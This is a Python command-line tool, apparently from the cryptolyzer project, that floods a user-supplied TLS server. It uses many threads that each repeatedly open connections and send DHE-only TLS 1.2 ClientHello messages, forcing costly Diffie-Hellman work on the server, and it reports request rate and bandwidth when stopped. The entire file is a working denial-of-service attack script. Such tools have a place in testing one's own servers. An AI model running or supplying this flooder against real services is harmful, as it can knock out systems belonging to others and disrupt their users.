#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import time
import socket
import threading

import abc
import attr
import urllib3

from cryptoparser.common.exception import InvalidType

from cryptoparser.tls.record import TlsRecord
from cryptoparser.tls.version import TlsProtocolVersionFinal, TlsVersion

from cryptolyzer.common.exception import SecurityError
from cryptolyzer.tls.client import (
    L7ClientTlsBase,
    TlsHandshakeClientHelloKeyExchangeDHE,
)


@attr.s(eq=False)
class DHEnforcerThreadStats(threading.Thread):
    failed_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    succeeded_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    sent_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    received_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    time_interval = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))


@attr.s(eq=False)
class DHEnforcerThreadBase(threading.Thread):
    uri = attr.ib(validator=attr.validators.instance_of(urllib3.util.url.Url))
    timeout = attr.ib(validator=attr.validators.instance_of(int))
    message_bytes = attr.ib(init=False, default=bytearray(), validator=attr.validators.instance_of(bytearray))
    stop = attr.ib(init=False, default=False, validator=attr.validators.instance_of(bool))
    stats = attr.ib(
        init=False, default=DHEnforcerThreadStats(), validator=attr.validators.instance_of(DHEnforcerThreadStats)
    )

    @abc.abstractmethod
    def _get_client(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def _prepare_packets(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def _send_packets(self, client):
        raise NotImplementedError()

    def __attrs_post_init__(self):
        threading.Thread.__init__(self)

        self.message_bytes = self._prepare_packets()

    def run(self):
        start_time = time.time()
        while not self.stop:
            try:
                client = self._get_client()
                client.init_connection()
                sent_byte_count, received_byte_count = self._send_packets(client)
            except (ConnectionResetError, socket.timeout, socket.error, InvalidType, SecurityError):
                self.stats.failed_request_num += 1
            else:
                self.stats.received_byte_count += received_byte_count
                self.stats.sent_byte_count += sent_byte_count
                self.stats.succeeded_request_num += 1
        end_time = time.time()

        self.stats.time_interval = end_time - start_time


class DHEnforcerThreadTLS(DHEnforcerThreadBase):
    def _get_client(self):
        if self.uri.scheme is None:
            scheme = 'tls'
        else:
            scheme = self.uri.scheme

        return L7ClientTlsBase.from_scheme(scheme, self.uri.host, self.uri.port, self.timeout)

    def _prepare_packets(self):
        protocol_version = TlsProtocolVersionFinal(TlsVersion.TLS1_2)
        client_hello = TlsHandshakeClientHelloKeyExchangeDHE(protocol_version, self.uri.host)
        client_hello_bytes = TlsRecord(client_hello.compose()).compose()

        return client_hello_bytes

    def _send_packets(self, client):
        return client.send(self.message_bytes), 0


class ParseURI(argparse.Action):  # pylint: disable=too-few-public-methods
    def __init__(self, option_strings, dest, nargs=None, **kwargs):
        super().__init__(option_strings, dest, **kwargs)

    def __call__(
            self, parser, namespace, values, option_string=None, first=(True, )
    ):  # pylint: disable=too-many-arguments
        try:
            namespace.uri = urllib3.util.parse_url(values)
        except urllib3.exceptions.LocationParseError as e:
            raise argparse.ArgumentError(self, e.args[0])


def main():
    parser = argparse.ArgumentParser(description='Diffie-Hellman ephemeral key exchnage enforcer')
    parser.add_argument('--timeout', dest='timeout', default=5, help='socket timeout in seconds')
    parser.add_argument('--thread-num', dest='thread_mum', default=1, type=int, help='number of threads to run')
    parser.add_argument(
        '--protocol', dest='protocol', required=True, choices=['tls', ], help='name of the protocol'
    )
    parser.add_argument('uri', metavar='uri', action=ParseURI, help='uri of the service')

    args = parser.parse_args()
    threads = []

    try:
        for _ in range(args.thread_mum):
            if args.protocol == 'tls':
                enforcer = DHEnforcerThreadTLS(args.uri, args.timeout)
            threads.append(enforcer)
            enforcer.start()

        client = threads[0]._get_client()
        print(os.linesep.join([
            '',
            '### Summary',
            '',
            '    * Thread num: {}',
            '    * Protocol: {}',
            '    * Address: {}',
            '    * IP: {}',
            '    * Port: {}',
        ]).format(
            args.thread_mum,
            client.get_scheme(),
            client.address,
            client.ip,
            client.port,
        ))

        while True:
            time.sleep(0.2)
    except KeyboardInterrupt:
        for thread in threads:
            thread.stop = True
            thread.join()

        if not threads or not all(map(lambda thread: thread.stats is not None, threads)):
            return
        output_template = os.linesep.join([
            '',
            '### Statistics',
            '',
            '* Requests',
            '    * Num: {}',
            '    * Speed: {:.2f} req/s',
            '    * Failed ratio: {:.2f} %',
            '    * Succeeded ratio: {:.2f} %',
            '* Bandwith',
            '    * Upload: {:.2f} KB/s',
            '    * Download: {:.2f} KB/s',
        ])
        output = output_template.format(
            sum([
                thread.stats.succeeded_request_num + thread.stats.failed_request_num
                for thread in threads
            ]),
            (sum([ thread.stats.succeeded_request_num + thread.stats.failed_request_num for thread in threads ]) /
                sum([thread.stats.time_interval for thread in threads])),
            sum([
                thread.stats.failed_request_num / (thread.stats.succeeded_request_num + thread.stats.failed_request_num)
                for thread in threads
                if thread.stats.succeeded_request_num or thread.stats.failed_request_num
            ]) * 100.0 / len(threads),
            sum([
                thread.stats.succeeded_request_num /
                (thread.stats.succeeded_request_num + thread.stats.failed_request_num)
                for thread in threads
                if thread.stats.succeeded_request_num or thread.stats.failed_request_num
            ]) * 100.0 / len(threads),
            (sum([thread.stats.sent_byte_count for thread in threads]) /
                sum([thread.stats.time_interval for thread in threads])) / 1000.0,
            (sum([thread.stats.received_byte_count for thread in threads]) /
                sum([thread.stats.time_interval for thread in threads])) / 1000.0,
        )
        print(output)


if __name__ == '__main__':
    main()
